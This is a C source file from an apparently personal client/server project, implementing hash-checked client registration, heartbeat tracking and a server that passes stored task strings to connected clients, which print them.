/*
    core.c

    last modified at: 2015/4/25
    error
    
    defines packet and functions used in communicate between client and server
*/

#include "core.h"
#include "../utils/utils.h"
#include "../alg/alexjlz_hash.h"
#include "../log/log.h"
#include "../tcpip/tcpip.h"
#include "../adt/list.h"

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <errno.h>
#include <pthread.h>

list_p client_list = NULL;
pthread_mutex_t client_list_mutex = PTHREAD_MUTEX_INITIALIZER;

int certify_register_packet(struct packet* p)
{
    char random_str[32] = {0};
    char client_hash[32] = {0};
    char server_hash[32] = {0};

    parse_string((p->value), random_str, "random_str");
    parse_string((p->value), client_hash, "hash");
    alexjlz_hash(random_str, server_hash);

    if ( strcmp(client_hash, server_hash) == 0 )
        return 1;
    else
        return 0;
}

/*
    alexjlz_register retval:
    0:  heartbeat
    1:  task sign
    -1: register failed
*/
int alexjlz_register(struct client *c)
{
    pthread_mutex_lock(&client_list_mutex);  // exclusively access to client_list

    int status = 0;
    struct client *c_iter = NULL;
    list_iter_p client_list_iter = list_iterator(client_list, FRONT);

    while ( (c_iter = list_next(client_list_iter)) != NULL )
    {
        if ( strcmp(c->uuid, c_iter->uuid) == 0 )
        {
            // update info
            alexjlz_log("client <<%s>> (ip:%s)  heartbeat report!\n", c->uuid, c->ip);
            break;
        }
    }
    if ( c_iter == NULL )  // heartbeat
    {
        alexjlz_log("client <<%s>> (ip:%s)  register success!\n", c->uuid, c->ip);
        list_add(client_list, c, sizeof(struct client));
        status = 0;
    }
    if ( strlen(c->cmd) != 0 )  // sign task
    {
        status = 1;
    }

    pthread_mutex_unlock(&client_list_mutex);
    return status;
}

void *serve_client ( void *arg )
{
    int client_fd = *((int *)arg);
    fd_set client_fd_set;
    struct timeval tv;
    int retval;
    FD_ZERO(&client_fd_set);
    FD_SET(client_fd, &client_fd_set);
    tv.tv_sec = 6;
    tv.tv_usec = 0;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p;  // client
    struct packet q;  // server
    struct client c; bzero(&c, sizeof(c));
    char *client_ip = c.ip;

    /* get remote ip address and record it */
    if ( get_remote_ip(client_fd, client_ip) == -1 )
    {
        alexjlz_log("Error, failed to get client ip, exit...\n");
        return ;
    }
    else
    {
        alexjlz_log("got connected from client %s\n", client_ip);
    }

    /* wait for client to send packet for 6 secs */
    retval = select(client_fd+1, &client_fd_set, NULL, NULL, &tv);
    if ( retval == -1 )  // error
    {
        alexjlz_log("Error, select retval == -1\n");
        if ( check_fd(client_fd) )
            close(client_fd);
        return ;
    }
    else if ( retval == 0 ) // timeout
    {
        alexjlz_log("Error, select timeout\n");
        if ( check_fd(client_fd) )
            close(client_fd);
        return;
    }
    bytes_read = readn ( client_fd, &p, sizeof(p) );  // else readable
    if ( bytes_read != sizeof(p) )
    {
        alexjlz_log("Error, serve readn read %d bytes\n", bytes_read);
        if ( check_fd(client_fd) )
            close(client_fd);
        return ;
    }
    if ( (p.type != packet_register) || !certify_register_packet(&p) )
    {
        alexjlz_log("Error, client's first packet is not of type register\n");
        if ( check_fd(client_fd) )
            close(client_fd);
        return ;
    }
    parse_string(p.value, c.uuid, "uuid");
    if ( alexjlz_register(&c) == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
    {
        alexjlz_log("Sign task to client\n");
        bzero(&q, sizeof(q));
        q.type = packet_task_sign;
        q.flag = 0;
        sprintf(q.value, "%s", c.cmd);
        if ( writen( client_fd, &q, sizeof(q)) != sizeof(q))
        {
            alexjlz_log("Error, write cmd: %s to client: %s\n", &(c.cmd), &(c.ip));
        }
    }

    if ( check_fd(client_fd) )
        close(client_fd);
    return ;
}

int ask_for_service( int server_fd )
{
    extern char uuid[32];

    fd_set server_fd_set;
    struct timeval tv;
    int retval;
    FD_ZERO(&server_fd_set);
    FD_SET(server_fd, &server_fd_set);
    tv.tv_sec = 6;
    tv.tv_usec = 0;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p; // client (self)
    struct packet q; // server (remote)
    char random_str[32] = {0};
    char hash[32] = {0};

    randomstr(random_str, 20);   // register to server
    alexjlz_hash(random_str, hash);
    sprintf(p.value, "random_str:%s hash:%s uuid:%s", random_str, hash, uuid);
    p.type = packet_register;
    if (writen(server_fd, &p, sizeof(p)) != sizeof(p) )
    {
        fprintf(stderr, "Error: writen\n");
        if ( check_fd(server_fd) )
            close(server_fd);
        return -1;
    }

    retval = select(server_fd+1, &server_fd_set, NULL, NULL, &tv);
    if ( retval == -1 )  // error
    {
        fprintf(stderr, "Error, select retval == -1\n");
        if ( check_fd(server_fd) )
            close(server_fd);
        return -1;
    }
    else if ( retval == 0 ) // timeout means no task
    {
        if ( check_fd(server_fd) )
            close(server_fd);
        return 0;
    }
    else  // sign comes ( or closed by server ? )
    {
        bytes_read = readn ( server_fd, &q, sizeof(q) );
        if ( bytes_read != sizeof(p) )
        {
            if ( check_fd(server_fd) )
                close(server_fd);
            return 0;
        }
        if ( q.type == packet_task_sign )
        {
            fprintf(stdout, "Info, got task:%s\n", q.value);
        }
    }
    
    if ( check_fd(server_fd) )
        close(server_fd);
    return 0;
}

void *serve_alexjlz( void *arg)
{
}
